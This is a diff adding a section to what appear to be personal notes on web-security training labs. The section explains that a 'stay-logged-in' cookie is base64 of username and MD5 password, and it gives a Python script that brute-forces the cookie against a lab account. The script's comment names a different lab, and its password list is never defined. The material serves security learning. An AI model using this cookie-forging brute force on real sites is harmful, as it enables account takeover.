@@ -114,3 +114,32 @@ for i in range(191, 9999):
     else:
         print(string, end=" ")
 ```
+
+## Lab: Brute-forcing a stay-logged-in cookie
+
+Bypass: `stay-logged-in` is `base64(username:md5(password))`. Brute-force
+
+```python
+# Lab: 2FA broken logic
+
+import hashlib
+import base64
+import requests
+
+url = 'https://0a5b009a039c341d800f7b37004a0036.web-security-academy.net/my-account?id=carlos'
+
+# Cookies
+for password in passwords:
+    cookies = {
+        'stay-logged-in': base64.b64encode("carlos:".encode() + hashlib.md5(password[:-1].encode()).hexdigest().encode()).decode('utf-8')
+    }
+
+    response = requests.post(url, cookies=cookies)
+
+    # print(response.status_code, response.text)
+
+    if ("Your username" in response.text):
+        print("Found it.", password[:-1])
+    else:
+        print(password[:-1])
+```
